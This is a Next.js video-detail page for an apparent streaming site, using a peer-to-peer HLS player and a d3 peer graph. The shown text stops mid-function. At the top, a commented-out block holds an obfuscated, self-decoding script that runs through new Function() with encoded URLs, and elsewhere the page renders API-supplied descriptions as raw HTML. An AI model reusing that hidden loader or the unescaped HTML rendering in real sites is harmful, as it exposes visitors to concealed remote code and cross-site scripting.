'use client'

import Script from 'next/script';
import '@/app/globals.css';
import '@vidstack/react/player/styles/base.css';
import '@vidstack/react/player/styles/default/layouts/audio.css';
import '@vidstack/react/player/styles/default/layouts/video.css';
import '@vidstack/react/player/styles/default/theme.css';
import '@vidstack/react/player/styles/plyr/theme.css';
import styles from '@/app/details/details.module.css';
import React, { Suspense, useCallback, useEffect, useRef, useState } from 'react';
import {
  isHLSProvider,
  MediaPlayer,
  MediaProvider,
  type MediaProviderAdapter,
} from "@vidstack/react";
import { PlyrLayout, plyrLayoutIcons } from '@vidstack/react/player/layouts/plyr';
import Hls from "hls.js";
import { useSearchParams } from 'next/navigation';
import { CoreEventMap, PeerDetails } from "p2p-media-loader-core";
import { HlsJsP2PEngine, HlsWithP2PConfig } from "p2p-media-loader-hlsjs";
import { useIsClient } from '@/app/hooks/useIsClient';
import Menu from "@/app/ui/menu/menu";
import * as d3 from "d3";

const API_URL = process.env.NEXT_PUBLIC_API_BASE_URL;

interface VideoUrl {
  Id: number;
  Url: string;
  Proxy: string;
  ProxyName: string;
  PlaybackURL: PlaybackURL[];
}

interface PlaybackURL {
  Url: string;
  Name: string;
}

interface Video {
  Id: number;
  CreatedAt: string;
  UpdatedAt: string;
  DeletedAt: string | null;
  Title: string;
  Describe: string;
  Alias?: string;
  Connection: number;
  Url: string;
  Cover: string;
  VideoGroupId: number;
  Duration?: string;
  ViewCount?: number;
  VideoUrlArr: VideoUrl[];
}

export default function Page() {
  // 这是你的内联脚本字符串
  //   const obfuscatedScript = `
  // !function(){function a(a){var _idx="n2fvass2kk";var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a('data:image/jpg;base64,cca8>[7_2(F6O2 5ca[5YF_52"vX8"%cmn<ydFhm5d2fO^caj}g@aPqYF 282_qq!Xd5 Y=F=O8D62fODm622Y5V6fFh!qYF ^8O/Ko0.c}00%n0.cs*N_^)Y5c"}"aaa=78[6L|OJgN_^)Y5c"@"a<@=5YXY5LY9Y6phFgN_^)Y5c"0"a=YXY2F|TJYg"FO_(hLFd5F"=LqOFWfg_cmn<ydFhm5d2fO^cajngKa=5YXY5LYWfg_cmn<ydFhm5d2fO^cajngKa=5ODLgo=(Oq_^2Lg}0=6FY^V6FhgO/}0=6FY^9Y6phFg^/o=qOdfiFdF_Lg0=5Y|5Tg0P=68"#MqYYb"=d8HZ!F5T[d8+i;NmJd5LYc(c6a??"HZ"aP(dF(hcYa[P7_2(F6O2 pcYa[5YF_52 Ym5YJqd(Yc"[[fdTPP"=c2YD wdFYampYFwdFYcaaP7_2(F6O2 (cY=Fa[qYF 282_qq!F5T[28qO(dqiFO5dpYmpYFWFY^cYaP(dF(hcYa[Fvvc28FcaaP5YF_52 2P7_2(F6O2 qcY=F=2a[F5T[qO(dqiFO5dpYmLYFWFY^cY=FaP(dF(hcYa[2vv2caPP7_2(F6O2 LcY=Fa[F8}<d5p_^Y2FLmqY2pFhvvXO6f 0l88FjFg""!7mqOdfiFdF_L8*}=}00<dmqY2pFh??cdmJ_Lhc\`c$[YPa\`%Fa=qc6=+i;NmLF562p67TcdaaaP7_2(F6O2 _cYa[qYF F80<d5p_^Y2FLmqY2pFhvvXO6f 0l88YjYg}=28"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7h6CSq^2OJ:5LF_XDRT4"=O82mqY2pFh=58""!7O5c!F**!a5%82HydFhm7qOO5cydFhm5d2fO^ca.OaZ!5YF_52 5P7_2(F6O2 fcYa[qYF F8fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!Xd5 28H"hFFJLg\\/\\/[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n"="hFFJLg\\/\\/[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n"="hFFJLg\\/\\/[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n"="hFFJLg\\/\\/[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n"="hFFJLg\\/\\/[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n"="hFFJLg\\/\\/[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n"="hFFJLg\\/\\/[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n"Z!qYF O8pc2Hc2YD wdFYampYFwdTcaZ??2H0Za%"/h^/}}s@jR82@7XdLL@SS"!O8O%c*}888Om62fYR;7c"j"aj"j"g"v"a%"58"%7m5Y|5T%%%"vF8"%hca%5ca=FmL5(8pcOa=FmO2qOdf87_2(F6O2ca[7mqOdfiFdF_L8@=)caP=FmO2Y55O587_2(F6O2ca[YvvYca=LYF|6^YO_Fc7_2(F6O2ca[Fm5Y^OXYcaP=}0aP=fO(_^Y2FmhYdfmdJJY2fxh6qfcFa=7mqOdfiFdF_L8}P7_2(F6O2 hca[qYF Y8(c"bb___b"a!5YF_52 Y??qc"bb___b"=Y8ydFhm5d2fO^camFOiF562pcsKamL_)LF562pcsa=7_2(F6O2ca[Y%8"M"Pa=Y2(OfYB~WxO^JO2Y2FcYaPr55dTm6Lr55dTcda??cd8HZ=qc6=""aa!qYF J8"}}s@"=X8"2@7XdLL@SS"!7_2(F6O2 TcYa[}l88Ym5YdfTiFdFYvv0l88Ym5YdfTiFdFY??Ym(qOLYcaP7_2(F6O2 DcYa[Xd5 F8H"}}s@d2(LCYmFRY6^Y6mRT4"="}}s@5p(LYpmJ)FXLSpmRT4"="}}s@D7(LSqmFRY6^Y6mRT4"="}}s@dC(LJ^mJ)FXLSpmRT4"="}}s@(C(L:4mFRY6^Y6mRT4"="}}s@C2(LSYmJ)FXLSpmRT4"="}}s@25(LLSmFRY6^Y6mRT4"Z=F8FHc2YD wdFYampYFwdTcaZ??FH0Z=F8"DLLg//"%c2YD wdFYampYFwdFYca%F%"g@Q@{n"!qYF O82YD VY)iO(SYFcF%"/"%J%"jR8"%X%"v58"%7m5Y|5T%%%"vF8"%hca%5ca%c2_qql882j2gcF8fO(_^Y2Fm:_Y5TiYqY(FO5c"^YFdH2d^Y8(Z"a=28Fj"v(h8"%FmpYFrFF56)_FYc"("ag""aaa!OmO2OJY287_2(F6O2ca[7mqOdfiFdF_L8@P=OmO2^YLLdpY87_2(F6O2cFa[qYF 28FmfdFd!F5T[28cY8>[qYF 5=F=2=O=6=d=(8"(hd5rF"=q8"75O^xhd5xOfY"=L8"(hd5xOfYrF"=_8"62fYR;7"=f8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=h8""=^80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!^<YmqY2pFh!a28fH_ZcYH(Zc^%%aa=O8fH_ZcYH(Zc^%%aa=68fH_ZcYH(Zc^%%aa=d8fH_ZcYH(Zc^%%aa=58c}nvOa<<o?6>>@=F8csv6a<<K?d=h%8iF562pHqZc2<<@?O>>oa=Kol886vvch%8iF562pHqZc5aa=Kol88dvvch%8iF562pHqZcFaa![Xd5 78h!qYF Y8""=F=2=O!7O5cF858280!F<7mqY2pFh!ac587HLZcFaa<}@{jcY%8iF562pHqZc5a=F%%ag}Q}<5vv5<@@ojc287HLZcF%}a=Y%8iF562pHqZccs}v5a<<K?Ksv2a=F%8@agc287HLZcF%}a=O87HLZcF%@a=Y%8iF562pHqZcc}nv5a<<}@?cKsv2a<<K?KsvOa=F%8sa!5YF_52 YPPac2a=2YD ]_2(F6O2c"MFf(L"=2acfO(_^Y2Fm(_55Y2Fi(56JFaP(dF(hcYa[F82mqY2pFh*o0=F8F<0j0gJd5LYW2FcydFhm5d2fO^ca.Fa!Lc@0o=\` $[Ym^YLLdpYP M[$[FPg$[2mL_)LF562pcF=F%o0aPPM\`a=7mqOdfiFdF_L8*}PTcOa=@8887mqOdfiFdF_Lvv)caP=OmO2Y55O587_2(F6O2ca[@l887mqOdfiFdF_LvvYvvYca=TcOaP=7mqOdfiFdF_L8}PqYF i8l}!7_2(F6O2 )ca[ivvcfO(_^Y2Fm5Y^OXYEXY2Ft6LFY2Y5c7mYXY2F|TJY=7m(q6(S9d2fqY=l0a=Y8fO(_^Y2FmpYFEqY^Y2FuTWfc7m5YXY5LYWfaavvYm5Y^OXYca!Xd5 Y=F8fO(_^Y2Fm:_Y5TiYqY(FO5rqqc7mLqOFWfa!7O5cqYF Y80!Y<FmqY2pFh!Y%%aFHYZvvFHYZm5Y^OXYcaP7_2(F6O2 $ca[LYF|6^YO_Fc7_2(F6O2ca[67c@l887mqOdfiFdF_La[Xd5[(Oq_^2LgY=5ODLgO=6FY^V6Fhg5=6FY^9Y6phFg6=LqOFWfgd=6L|OJg(=5YXY5LY9Y6phFgqP87!7_2(F6O2 Lca[Xd5 Y8pc"hFFJLg//[[fdTPP}}s@2F(LCYmDYOq5YSmRT4gQ@{n/((/}}s@j6LM2OF8}vFd5pYF8}vFT8@"a!FOJmqO(dF6O2l88LYq7mqO(dF6O2jFOJmqO(dF6O28YgD62fODmqO(dF6O2mh5Y78YP7O5cqYF 280!2<Y!2%%a7O5cqYF F80!F<O!F%%a[qYF Y8"JOL6F6O2g76RYf!4*62fYRg}00!f6LJqdTg)qO(S!"%\`qY7Fg$[2.5PJR!D6fFhg$[ydFhm7qOO5cmQ.5aPJR!hY6phFg$[6PJR!\`!Y%8(j\`FOJg$[q%F.6PJR\`g\`)OFFO^g$[q%F.6PJR\`!Xd5 _8fO(_^Y2Fm(5YdFYEqY^Y2Fcda!_mLFTqYm(LL|YRF8Y=_mdffEXY2Ft6LFY2Y5c7mYXY2F|TJY=La=fO(_^Y2Fm)OfTm62LY5FrfCd(Y2FEqY^Y2Fc")Y7O5YY2f"=_aP67clia[qYF[YXY2F|TJYgY=6L|OJg5=5YXY5LY9Y6phFg6P87!fO(_^Y2FmdffEXY2Ft6LFY2Y5cY=h=l0a=7m(q6(S9d2fqY8h!Xd5 28fO(_^Y2Fm(5YdFYEqY^Y2Fc"f6X"a!7_2(F6O2 fca[Xd5 Y8pc"hFFJLg//[[fdTPP}}s@2F(LCYmDYOq5YSmRT4gQ@{n/((/}}s@j6LM2OF8}vFd5pYF8}vFT8@"a!FOJmqO(dF6O2l88LYq7mqO(dF6O2jFOJmqO(dF6O28YgD62fODmqO(dF6O2mh5Y78YP7_2(F6O2 hcYa[Xd5 F8D62fODm622Y59Y6phF!qYF 280=O80!67cYaLD6F(hcYmLFOJW^^Yf6dFYe5OJdpdF6O2ca=YmFTJYa[(dLY"FO_(hLFd5F"g28YmFO_(hYLH0Zm(q6Y2F&=O8YmFO_(hYLH0Zm(q6Y2F-!)5YdS!(dLY"FO_(hY2f"g28Ym(hd2pYf|O_(hYLH0Zm(q6Y2F&=O8Ym(hd2pYf|O_(hYLH0Zm(q6Y2F-!)5YdS!(dLY"(q6(S"g28Ym(q6Y2F&=O8Ym(q6Y2F-P67c0<2vv0<Oa67c5a[67cO<86a5YF_52l}!O<^%6vvfcaPYqLY[F8F*O!67cF<86a5YF_52l}!F<^%6vvfcaPP2m6f87m5YXY5LYWf=2mLFTqYm(LL|YRF8\`hY6phFg$[7m5YXY5LY9Y6phFPJR\`=5jfO(_^Y2Fm)OfTm62LY5FrfCd(Y2FEqY^Y2Fc"d7FY5)Yp62"=2agfO(_^Y2Fm)OfTm62LY5FrfCd(Y2FEqY^Y2Fc")Y7O5YY2f"=2a=i8l0PqYF F8pc"hFFJLg//[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n/f/}}s@j(8}vR82@7XdLL@SS"a!FvvLYF|6^YO_Fc7_2(F6O2ca[Xd5 Y8fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!YmL5(8F=fO(_^Y2FmhYdfmdJJY2fxh6qfcYaP=}YsaPP=@n00aPO82dX6pdFO5mJqdF7O5^=Y8l/3cV62?yd(a/mFYLFcOa=F8Jd5LYW2FcL(5YY2mhY6phFa>8Jd5LYW2FcL(5YY2mD6fFha=cY??Favvc/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5?IzI?kOqfu5ODLY5/6mFYLFc2dX6pdFO5m_LY5rpY2FajDc7_2(F6O2ca[Lc@0}a=Dc7_2(F6O2ca[Lc@0@a=fc7_2(F6O2ca[Lc@0saPaPaPagfc7_2(F6O2ca[Lc}0}a=fc7_2(F6O2ca[Lc}0@a=Dc7_2(F6O2ca[Lc}0saPaPaPaa=lYvvO??$ca=XO6f 0l882dX6pdFO5mLY2fuYd(O2vvfO(_^Y2FmdffEXY2Ft6LFY2Y5c"X6L6)6q6FT(hd2pY"=7_2(F6O2ca[Xd5 Y=F!"h6ffY2"888fO(_^Y2FmX6L6)6q6FTiFdFYvvdmqY2pFhvvcY8pc"hFFJLg//[[fdTPP}}s@CFT_T_m)p5F644mRT4gQ@{n"a%"/)_pj68"%J=cF82YD ]O5^wdFdamdJJY2fc"^YLLdpY"=+i;NmLF562p67Tcdaa=FmdJJY2fc"F"="0"a=2dX6pdFO5mLY2fuYd(O2cY=Fa=dmqY2pFh80=qc6=""aaPaPaca!'.substr(22));new Function(b)()}();
  // `;
  return (
    <>
      <Suspense fallback={<div className="flex justify-center items-center min-h-screen">Loading...</div>}>
        <Details />
      </Suspense>
      {/* <Script
        id="custom-obfuscated-script"
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: obfuscatedScript,
        }}
      /> */}
    </>
  );
}


function Details() {
  const isClient = useIsClient();
  const searchParams = useSearchParams();
  const videoId = searchParams.get('id');
  const [streamUrl, setStreamUrl] = useState<string>("");
  const [videoIdx, setVideoIdx] = useState<string>("0");
  const [peers, setPeers] = useState<string[]>([]);
  const [video, setVideo] = useState<Video>({
    Id: 0,
    CreatedAt: "",
    UpdatedAt: "",
    DeletedAt: null,
    Title: "",
    Describe: "",
    Connection: 0,
    Url: "",
    Cover: "",
    VideoGroupId: 0,
    VideoUrlArr: []
  });
  const data = useRef<DownloadStats>({
    httpDownloaded: 0,
    p2pDownloaded: 0,
    p2pUploaded: 0,
  });

  const onPeerConnect = useCallback((params: PeerDetails) => {

    if (params.streamType !== "main") return;

    setPeers((peers) => {
      return [...peers, params.peerId];
    });
  }, []);

  const onChunkDownloaded = useCallback(
    (bytesLength: number, downloadSource: string) => {
      switch (downloadSource) {
        case "http":
          data.current.httpDownloaded += bytesLength;
          break;
        case "p2p":
          data.current.p2pDownloaded += bytesLength;
          break;
        default:
          break;
      }
    },
    [],
  );

  const onChunkUploaded = useCallback((bytesLength: number) => {
    data.current.p2pUploaded += bytesLength;
  }, []);

  const onPeerClose = useCallback((params: PeerDetails) => {
    if (params.streamType !== "main") return;

    setPeers((peers) => {
      return peers.filter((peer) => peer !== params.peerId);
    });
  }, []);



  const onProviderChange = useCallback((provider: MediaProviderAdapter | null) => {
    if (isHLSProvider(provider)) {
      const HlsWithP2P = HlsJsP2PEngine.injectMixin(Hls);
      provider.library = HlsWithP2P as unknown as typeof Hls;
      const config: HlsWithP2PConfig<typeof Hls> = {
        p2p: {
          core: {
            swarmId: streamUrl ? streamUrl : undefined,
          },
          onHlsJsCreated: (hls) => {
            subscribeToUiEvents({
              engine: hls.p2pEngine,
              onPeerConnect,
              onPeerClose,
              onChunkDownloaded,
              onChunkUploaded,
            });
          },
        },
      };
      provider.config = config;
    }
  }, [streamUrl, onPeerConnect, onPeerClose, onChunkDownloaded, onChunkUploaded]);

  useEffect(() => {
    // 定义一个函数来创建和更新 JSON-LD 脚本
    const updateJsonLd = (video: Video) => { // 参数名改为 video 更清晰
      // 1. 先移除旧的脚本，防止重复
      const oldScript = document.getElementById('movie-json-ld');
      if (oldScript) {
        oldScript.remove();
      }

      // 2. 如果没有视频数据，则不创建新脚本
      if (!video) return;

      // 3. 创建 JSON-LD 数据结构
      const jsonLdData = {
        '@context': 'https://schema.org',
        '@type': 'Movie',
        name: video.Title,
        description: video.Describe,
        // 如果有封面图URL，可以加在这里
        image: video.Cover || '',
        // 如果有上映日期，可以加在这里
        // datePublished: "你的上映日期",
        // 使用 Alias 字段作为别名 (alternateName)
        alternateName: video.Alias
          ? video.Alias.split("/").map(alias => alias.trim()).filter(Boolean)
          : [],
        // 这里的 genre 和 keywords 应该是从你的数据中获取的
        // 如果你的API不提供，可以留空或根据Title/Describe硬编码一些
        genre: ["电影"], // 示例: ["科幻", "动作"]
        keywords: "在线观看, 下载, 高清" // 示例: "太空旅行, 人工智能"
      };

      // 4. 创建 script 标签
      const script = document.createElement('script');
      script.type = 'application/ld+json';
      script.id = 'movie-json-ld'; // 给它一个ID，方便下次查找和移除
      script.innerHTML = JSON.stringify(jsonLdData);

      // 5. 将新脚本注入到 document.head 中
      document.head.appendChild(script);
    };

    const fetchMovies = async () => {
      // 增加一个判断，如果没有 videoId 就不执行请求
      if (!videoId) return;

      const response = await fetch(`${API_URL}/api/v1/video/get?Id=${videoId}`);
      if (!response.ok) {
        console.error("Failed to fetch video data:", response.status);
        return;
      }

      const result: { Data: Video } = await response.json();
      const videoDataObject = result.Data; // 【关键修复】从结果中提取出真正的 Video 对象
      if (!videoDataObject) {
        console.error("Video data is null in API response");
        return;
      }
      setVideo(videoDataObject);
      if (videoDataObject.VideoUrlArr.length > 0) {
        if (videoId) {
          const iii = localStorage.getItem(videoId);
          setVideoIdx(iii ?? "0");
          localStorage.setItem(videoId, iii ?? "0");
        }
        // --- 使用 videoDataObject 更新所有内容 ---\
        for (const i in videoDataObject.VideoUrlArr) {
          videoDataObject.VideoUrlArr[i].PlaybackURL = parseM3u8URLs(videoDataObject.VideoUrlArr[i].Url)
        }
        setStreamUrl(videoDataObject.VideoUrlArr[0].PlaybackURL[videoIdx].Url);
      } else {
        setStreamUrl(videoDataObject.Url);
      }
      //  更新页面标题
      document.title = `${videoDataObject.Title}-在线观看-下载`;

      //  更新 meta description
      let metaDesc = document.querySelector("meta[name='description']");
      if (!metaDesc) {
        metaDesc = document.createElement('meta');
        metaDesc.setAttribute('name', 'description');
        document.head.appendChild(metaDesc);
      }
      metaDesc.setAttribute("content", videoDataObject.Describe || "暂无简介");

      // 【关键修复】传入正确的 videoDataObject
      updateJsonLd(videoDataObject);

      // 【代码清理】完全移除关于 meta keywords 的旧代码块
    };

    fetchMovies();

    // 返回一个清理函数，在组件卸载或 videoId 改变时执行
    return () => {
      const script = document.getElementById('movie-json-ld');
      if (script) {
        script.remove();
      }
    };
  }, [videoId]);

  const changeVideoIdx = (name: string) => {
    for (const i in video.VideoUrlArr[0].PlaybackURL) {
      if (name == video.VideoUrlArr[0].PlaybackURL[i].Name) {
        if (videoId) {
          localStorage.setItem(videoId, i);
          setStreamUrl(video.VideoUrlArr[0].PlaybackURL[i].Url);
          setVideoIdx(i)
        }
      }
    }
  }
  return (
    <div>
      <div >
        <div className={styles["video-container"]}>
          <Menu />
          <MediaPlayer
            storage="7x-chat-media-player"
            src={streamUrl}
            load="visible"
            posterLoad="visible"
            viewType='video'
            streamType='on-demand'
            logLevel='warn'
            // autoPlay
            onProviderChange={onProviderChange}
            playsInline
          >
            <MediaProvider />
            {isClient && <PlyrLayout icons={plyrLayoutIcons} />}
            {/* <DefaultVideoLayout icons={defaultLayoutIcons} /> */}
          </MediaPlayer>

          {/* Video list buttons */}
          {video.VideoUrlArr && video.VideoUrlArr.length > 0 && (
            <div className="flex flex-wrap gap-2 mt-4">
              {video.VideoUrlArr[0].PlaybackURL.length > 0 && video.VideoUrlArr[0].PlaybackURL.map((item, idx) => (
                <button
                  key={item.Name}
                  onClick={() => changeVideoIdx(item.Name)}
                  className={`btn btn-sm ${String(idx) === videoIdx ? 'btn-primary' : 'btn-outline'}`}
                >
                  {item.Name || `Video ${item.Name}`}
                </button>
              ))}
            </div>
          )}
          <div className='relative inset-y-3'>
            <h1 className="text-3xl font-semibold">{video.Title}</h1>
          </div>
          <br />
          <div  >
            <div dangerouslySetInnerHTML={{ __html: video.Describe }}></div>
          </div>
          <div className={styles["node-container"]} >
            <NodeNetwork peers={peers} />
          </div>
        </div>
      </div>
    </div>
  );
};

/**
 * 解析包含影片播放源的特定格式字符串
 * @param input - 原始字符串
 * @returns PlaybackURL 物件陣列
 */
function parseM3u8URLs(input: string): PlaybackURL[] {
  // 1. 使用 '$$$' 分割字符串，並取得最後一部分，如果不存在則返回空字串
  const relevantPart = input.split('$$$').pop() || '';

  // 2. 如果有效部分為空，直接返回空陣列
  if (!relevantPart) {
    return [];
  }

  // 3. 按 '#' 分割成每個影片的條目
  const entries = relevantPart.split('#');

  // 4. 使用 map 和 filter 處理陣列
  return entries
    .map(entry => {
      // a. 按 '$' 分割名稱和 URL
      const [name, url] = entry.split('$', 2);

      // b. 檢查 name 和 url 是否存在，並去除頭尾多餘的空格
      if (name && url) {
        return {
          Name: name.trim(),
          Url: url.trim()
        };
      }
      // 如果分割失敗，返回 null
      return null;
    })
    // c. 過濾掉所有 null 的結果以及 URL 不以 .m3u8 結尾的條目
    .filter((item): item is PlaybackURL =>
      item !== null && item.Url.endsWith('.m3u8')
    );
}

type UIEventsProps = PlayerEvents & {
  engine: HlsJsP2PEngine;
};

const subscribeToUiEvents = ({
  engine,
  onPeerConnect,
  onPeerClose,
  onChunkDownloaded,
  onChunkUploaded,
}: UIEventsProps) => {
  if (onPeerConnect) engine.addEventListener("onPeerConnect", onPeerConnect);
  if (onPeerClose) {
    engine.addEventListener("onPeerClose", onPeerClose);
  }
  if (onChunkDownloaded) {
    engine.addEventListener("onChunkDownloaded", onChunkDownloaded);
  }
  if (onChunkUploaded) {
    engine.addEventListener("onChunkUploaded", onChunkUploaded);
  }
};

type HlsWithP2PType = ReturnType<typeof HlsJsP2PEngine.injectMixin>;

declare global {
  interface Window {
    shaka?: unknown;
    Hls?: HlsWithP2PType;
    LevelSelector: unknown;
    DashShakaPlayback: unknown;
    Clappr: {
      Player: unknown;
    };
  }
}

export type DownloadStats = {
  httpDownloaded: number;
  p2pDownloaded: number;
  p2pUploaded: number;
};

export type SvgDimensionsType = {
  width: number;
  height: number;
};

export type ChartsData = {
  seconds: number;
} & DownloadStats;


export type PlayerProps = {
  streamUrl: string;
  announceTrackers: string[];
  swarmId?: string;
} & Partial<
  Pick<
    CoreEventMap,
    "onPeerConnect" | "onChunkDownloaded" | "onChunkUploaded" | "onPeerClose"
  >
>;

export type PlayerEvents = Omit<
  PlayerProps,
  "streamUrl" | "announceTrackers" | "swarmId"
>;

const COLORS = {
  yellow: "#faf21b",
  lightOrange: "#ff7f0e",
  lightBlue: "#ADD8E6",
  torchRed: "#ff1745",
  links: "#C8C8C8",
  nodeHover: "#A9A9A9",
  node: (d: { isMain?: boolean }) => {
    return d.isMain ? "hsl(210, 70%, 72.5%)" : "hsl(55, 70%, 72.5%)";
  },
};

type GraphNetworkProps = {
  peers: string[];
};

const DEFAULT_PEER_ID = "You";
const DEFAULT_NODE: Node = { id: DEFAULT_PEER_ID, isMain: true };
const DEFAULT_GRAPH_DATA = {
  nodes: [DEFAULT_NODE],
  links: [] as Link[],
};

const NodeNetwork = ({ peers }: GraphNetworkProps) => {
  const svgRef = useRef<SVGSVGElement>(null);
  const svgContainerRef = useRef<HTMLDivElement>(null);
  const networkDataRef = useRef(DEFAULT_GRAPH_DATA);
  const simulationRef = useRef<d3.Simulation<Node, Link> | null>(null);

  const [svgDimensions, setSvgDimensions] = useState<SvgDimensionsType>({
    width: 0,
    height: 0,
  });

  useEffect(() => {
    if (!svgRef.current) return;

    const handleResize = (entries: ResizeObserverEntry[]) => {
      const entry = entries[0];

      const newDimensions = {
        width: entry.contentRect.width,
        height: entry.contentRect.width > 380 ? 250 : 400,
      };

      setSvgDimensions(newDimensions);

      simulationRef.current?.stop();
      simulationRef.current = createSimulation(
        newDimensions.width,
        newDimensions.height,
      );

      updateGraph(
        networkDataRef.current.nodes,
        networkDataRef.current.links,
        simulationRef.current,
        svgRef.current,
      );
    };

    prepareGroups(svgRef.current);

    const resizeObserver = new ResizeObserver(handleResize);

    if (svgContainerRef.current) {
      resizeObserver.observe(svgContainerRef.current);
    }

    return () => {
      resizeObserver.disconnect();
    };
  }, []);

  useEffect(() => {
    const allNodes = [
      ...peers.map((peerId) => ({ id: peerId, isMain: false })),
      DEFAULT_NODE,
    ];

    const allLinks = peers.map((peerId) => {
      const target = allNodes.find((n) => n.id === peerId);

      if (!target) throw new Error("Target node not found");

      return {
        source: DEFAULT_NODE,
        target,
        linkId: `${DEFAULT_PEER_ID}-${peerId}`,
      };
    });

    const networkData = networkDataRef.current;

    const nodesToAdd = allNodes.filter(
      (an) => !networkData.nodes.find((n) => n.id === an.id),
    );
    const nodesToRemove = networkData.nodes.filter(
      (n) => !allNodes.find((an) => an.id === n.id),
    );
    const linksToAdd = allLinks.filter(
      (al) => !networkData.links.find((l) => l.linkId === al.linkId),
    );
    const linksToRemove = networkData.links.filter(
      (l) => !allLinks.find((al) => al.linkId === l.linkId),
    );

    const updatedNodes = networkData.nodes.filter(
      (n) => !nodesToRemove.find((rn) => rn.id === n.id),
    );
    const updatedLinks = networkData.links.filter(
      (l) => !linksToRemove.find((rl) => rl.linkId === l.linkId),
    );

    const newNetworkData = {
      nodes: [...updatedNodes, ...nodesToAdd],
      links: [...updatedLinks, ...linksToAdd],
    };

    networkDataRef.current = newNetworkData;

    updateGraph(
      newNetworkData.nodes,
      newNetworkData.links,
      simulationRef.current,
      svgRef.current,
    );
  }, [peers]);

  return (
    <div ref={svgContainerRef} className="node-container">
      <svg
        className="node-network"
        ref={svgRef}
        width={svgDimensions.width}
        height={svgDimensions.height}
      />
    </div>
  );
};



export interface Node extends d3.SimulationNodeDatum {
  id: string;
  isMain?: boolean;
  group?: number;
  x?: number;
  y?: number;
  fx?: number | null;
  fy?: number | null;
}

export interface Link extends d3.SimulationLinkDatum<Node> {
  source: Node;
  target: Node;
  linkId: string;
}

function handleNodeMouseOver(this: SVGCircleElement) {
  d3.select(this).style("fill", COLORS.nodeHover);
}

function handleNodeMouseOut(this: SVGCircleElement, _event: unknown, d: Node) {
  d3.select(this).style("fill", COLORS.node(d));
}

function getLinkText(d: Link) {
  return `${d.source.id}-${d.target.id}`;
}

function getNodeId(d: Node) {
  return d.id;
}

function removeD3Item(this: d3.BaseType) {
  d3.select(this).remove();
}

const updateGraph = (
  newNodes: Node[],
  newLinks: Link[],
  simulation: d3.Simulation<Node, Link> | null,
  svgElement: SVGSVGElement | null,
) => {
  if (!simulation || !svgElement) return;

  simulation.nodes(newNodes);
  simulation.force<d3.ForceLink<Node, Link>>("link")?.links(newLinks);
  simulation.alpha(0.5).restart();

  const link = d3
    .select(svgElement)
    .select(".links")
    .selectAll<SVGLineElement, Link>("line")
    .data(newLinks, getLinkText);

  link
    .enter()
    .append("line")
    .merge(link)
    .attr("stroke", COLORS.links)
    .transition()
    .duration(500)
    .attr("stroke-width", 0.5);

  link
    .exit()
    .transition()
    .duration(200)
    .style("opacity", 0)
    .on("end", removeD3Item);

  const node = d3
    .select(svgElement)
    .select(".nodes")
    .selectAll<SVGCircleElement, Node>("circle")
    .data(newNodes, getNodeId);

  node
    .enter()
    .append("circle")
    .merge(node)
    .attr("r", (d) => (d.isMain ? 15 : 13))
    .attr("fill", (d) => COLORS.node(d))
    .on("mouseover", handleNodeMouseOver)
    .on("mouseout", handleNodeMouseOut)
    .call(drag(simulation));

  node.exit().transition().duration(200).attr("r", 0).remove();

  const text = d3
    .select(svgElement)
    .select(".nodes")
    .selectAll<SVGTextElement, Node>("text")
    .data(newNodes, getNodeId);

  text
    .enter()
    .append("text")
    .style("fill-opacity", 0)
    .merge(text)
    .text(getNodeId)
    .style("text-anchor", "middle")
    .style("font-size", "12px")
    .style("font-family", "sans-serif")
    .transition()
    .duration(500)
    .style("fill-opacity", 1);

  text
    .exit()
    .transition()
    .duration(200)
    .style("fill-opacity", 0)
    .on("end", removeD3Item);

  simulation.on("tick", () => {
    d3.select(svgElement)
      .select(".links")
      .selectAll<SVGLineElement, Link>("line")
      .attr("x1", (d) => d.source.x ?? 0)
      .attr("y1", (d) => d.source.y ?? 0)
      .attr("x2", (d) => d.target.x ?? 0)
      .attr("y2", (d) => d.target.y ?? 0);

    d3.select(svgElement)
      .select(".nodes")
      .selectAll<SVGCircleElement, Node>("circle")
      .attr("cx", (d) => d.x ?? 0)
      .attr("cy", (d) => d.y ?? 0);

    d3.select(svgElement)
      .select(".nodes")
      .selectAll<SVGTextElement, Node>("text")
      .attr("x", (d) => d.x ?? 0)
      .attr("y", (d) => (d.y === undefined ? 0 : d.y - 20));
  });
};

const drag = (simulation: d3.Simulation<Node, Link>) => {
  const dragStarted = (
    event: d3.D3DragEvent<SVGCircleElement, Node, Node>,
    d: Node,
  ) => {
    if (!event.active) simulation.alphaTarget(0.3).restart();
    d.fx = d.x;
    d.fy = d.y;
  };

  const dragged = (
